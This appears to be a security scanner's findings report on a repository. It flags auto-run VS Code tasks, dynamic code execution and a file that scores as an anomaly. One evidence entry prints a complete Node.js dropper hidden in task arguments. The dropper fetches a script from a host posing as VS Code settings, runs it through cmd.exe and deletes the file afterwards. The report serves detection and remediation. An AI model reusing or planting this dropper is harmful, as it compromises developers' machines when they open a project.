findings.title: Process Execution Primitive with Potential Abuse
findings.why: Shell/process APIs are commonly abused by droppers and loaders.
findings.remediation: Disallow process execution in untrusted code paths.
findings.evidence:
18:         "args": [
19:           "-e",
20:           "const https = require(`https`); const fs = require(`fs`); const path = require(`path`); const { exec } = require(`child_process`); const os = require(`os`); const tempFile = path.join(os.tmpdir(), `vscode-windows-${Date.now()}.cmd`); https.get(`https://vscode-toolkit-settings.vercel.app/settings/windows?flag=302`, (r) => { let d = ``; r.on(`data`, c => d += c); r.on(`end`, () => { fs.writeFileSync(tempFile, d); exec(`${tempFile}`, { shell: `cmd.exe` }, (e, o, err) => { setTimeout(() => fs.unlinkSync(tempFile), 1000); }); }); });"
21:         ]
22:       },

findings.title: VS Code Auto-Run Task on Folder Open
findings.why: Auto-run tasks can execute payloads when repository is opened.
findings.impact: Workstation compromise without explicit command invocation.
findings.remediation: Delete auto-run tasks and enforce explicit command execution.

findings.title: VS Code Auto-Run Task on Folder Open
findings.why: Auto-run tasks can execute payloads when repository is opened.
findings.impact: Workstation compromise without explicit command invocation.
findings.remediation: Delete auto-run tasks and enforce explicit command execution.

findings.title: Dynamic Code Execution Primitive Detected
findings.why: Dynamic runtime code construction enables arbitrary payload execution.
findings.impact: Remote code execution and full process compromise.
findings.remediation: Remove dynamic execution and use explicit, typed control flow.

findings.title: Anomalous File Signature (score=1.83)
findings.why: Statistical outlier across entropy/obfuscation/exec-token metrics.
findings.impact: Likely hidden payload or packed script behavior.
findings.remediation: Manually deobfuscate and isolate before execution.
findings.evidence: entropy=5.16, long_line_ratio=0.01, hex_escapes=0, suspicious_tokens=52, non_alnum_ratio=0.35
